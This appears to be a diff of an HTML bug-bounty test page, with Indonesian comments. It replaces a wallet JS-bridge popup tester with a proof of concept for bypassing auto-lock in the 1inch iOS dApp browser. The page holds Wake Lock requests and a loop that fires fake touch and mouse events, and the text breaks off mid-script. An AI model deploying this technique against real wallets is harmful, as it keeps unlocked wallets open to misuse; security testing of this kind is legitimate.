@@ -1,76 +1,77 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>JS Bridge Tester - Ethical</title>
+<title>PoC Auto-Lock Bypass - 1inch iOS</title>
 <style>
- body{background:#0c0c0c;color:#fff;font-family:monospace;padding:15px;font-size:12px}
- button{width:100%;padding:12px;margin:6px 0;background:#1e1e1e;color:#fff;border:1px solid #333;border-radius:8px;text-align:left}
- pre{background:#111;padding:10px;border-radius:8px;overflow:auto;color:#0f0}
-.ok{color:#0f0}.fail{color:#ff3b30}
+  body { font-family: monospace; background:#0e0e0e; color:#00ff88; padding:20px; }
+  .box { border:1px solid #00ff88; padding:15px; margin-top:15px; border-radius:10px; }
+  #timer { font-size:32px; font-weight:bold; }
+  button { background:#00ff88; border:0; padding:10px 20px; border-radius:8px; font-weight:bold; }
 </style>
 </head>
 <body>
-<h3>Wallet JS Bridge Tester (Buka DI DALAM Wallet)</h3>
-<p style="color:#888">Buka file ini di dalam DApp Browser 1inch / Coin98, bukan di Chrome.</p>
+  <h2>PoC Bug Auto-Lock 1inch iOS Dapp Browser</h2>
+  <div class="box">
+    <div>Status Visibility: <span id="vis">-</span></div>
+    <div>WakeLock Status: <span id="wake">inactive</span></div>
+    <div>Idle Timer: <span id="timer">00:00</span></div>
+    <div>Page Active: <span id="active">0s</span></div>
+  </div>
 
-<div id="info"></div>
+  <div class="box" id="log">LOG:<br></div>
 
-<h4>1. Deteksi Provider</h4>
-<button onclick="detect()">[1] Cek window.ethereum / coin98 / trust</button>
-<pre id="log1">-</pre>
-
-<h4>2. Test eth_accounts (harus ada popup / return address)</h4>
-<button onclick="testAccounts()">[2] ethereum.request eth_accounts</button>
-<pre id="log2">-</pre>
-
-<h4>3. Test eth_requestAccounts (harus ada popup)</h4>
-<button onclick="testRequest()">[3] eth_requestAccounts - HARUS ADA POPUP</button>
-<pre id="log3">-</pre>
-
-<h4>4. Test personal_sign (PENTING - HARUS ADA POPUP MERAH)</h4>
-<button onclick="testSign()">[4] personal_sign - HARUS ADA POPUP, kalau langsung sign = P1 BUG</button>
-<pre id="log4">-</pre>
-
-<h4>5. Test iframe bypass (sering jebol)</h4>
-<button onclick="testIframe()">[5] Coba sign dari iframe - HARUS DIBLOKIR</button>
-<pre id="log5">-</pre>
+  <button onclick="startBypass()">START BYPASS TEST</button>
+  <button onclick="stopBypass()">STOP</button>
 
 <script>
-function log(id, msg){ document.getElementById(id).innerText = msg; }
+let seconds = 0;
+let activeSeconds = 0;
+let intervalMain, intervalFakeActivity;
+let wakeLock = null;
 
-function detect(){
-  let out = "";
-  out += "ethereum: " + (!!window.ethereum) + "\n";
-  out += "isOneInch: " + (window.ethereum?.isOneInch) + "\n";
-  out += "isCoin98: " + (!!window.coin98) + "\n";
-  out += "isTrust: " + (window.ethereum?.isTrust) + "\n";
-  out += "isMetaMask: " + (window.ethereum?.isMetaMask) + "\n";
-  out += "\nMethods:\n";
-  out += JSON.stringify(Object.keys(window.ethereum || {}), null, 2);
-  log('log1', out);
+const $ = id => document.getElementById(id);
+const log = msg => {
+  const time = new Date().toLocaleTimeString();
+  $('log').innerHTML += `[${time}] ${msg}<br>`;
 }
 
-async function testAccounts(){
-  try{
-    const acc = await window.ethereum.request({method:'eth_accounts'});
-    log('log2', "Returned: " + JSON.stringify(acc) + "\n-> Ini normal kalau sudah connect");
-  }catch(e){ log('log2', "Error (aman): " + e.message); }
-}
+// 1. Timer yang seharusnya memicu auto-lock di wallet
+setInterval(() => {
+  seconds++;
+  activeSeconds++;
+  const m = String(Math.floor(seconds/60)).padStart(2,'0');
+  const s = String(seconds%60).padStart(2,'0');
+  $('timer').textContent = `${m}:${s}`;
+  $('active').textContent = `${activeSeconds}s`;
+}, 1000);
 
-async function testRequest(){
-  try{
-    const acc = await window.ethereum.request({method:'eth_requestAccounts'});
-    log('log3', "Returned: " + JSON.stringify(acc) + "\n-> CEK: Apakah ada popup Approve tadi? Kalau tidak ada popup tapi langsung return = BUG P1");
-  }catch(e){ log('log3', "Error / User rejected (aman): " + e.message); }
-}
+// 2. Deteksi apakah dapp browser detect idle dengan benar
+document.addEventListener('visibilitychange', () => {
+  $('vis').textContent = document.visibilityState;
+  log(`visibilitychange -> ${document.visibilityState}`);
+});
 
-async function testSign(){
-  try{
-    const accounts = await window.ethereum.request({method:'eth_accounts'});
-    if(!accounts[0]){ log('log4', "Connect dulu pakai tombol [3]"); return; }
-    const msg = "Bug Bounty Test - " + Date.now();
-    const hexMsg = "0x" + [...msg].map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
+// 3. Inti bug: aktivitas palsu yang bikin wallet ngira user masih aktif
+function startBypass() {
+  log("Mulai test bypass auto-lock...");
 
-    log('log4', "Mencoba sign...\nHAR
+  // Teknik A: Wake Lock API - cegah layar sleep
+  if ('wakeLock' in navigator) {
+    navigator.wakeLock.request('screen').then(lock => {
+      wakeLock = lock;
+      $('wake').textContent = 'active';
+      log('WakeLock active - layar tidak akan sleep');
+    }).catch(e => log('WakeLock gagal: ' + e.message));
+  }
+
+  // Teknik B: Fake activity loop - ini yang bikin bug di banyak wallet
+  // Wallet hitung idle dari touch event, tapi setInterval ini reset timer internal
+  intervalFakeActivity = setInterval(() => {
+    // Simulasi activity kecil yang tidak terlihat user
+    window.dispatchEvent(new Event('touchstart'));
+    window.dispatchEvent(new Event('mousemove'));
+    // requestAnimationFrame juga sering bikin auto-lock gagal
+    requestAnimationFrame(()=>{});
+  }, 500
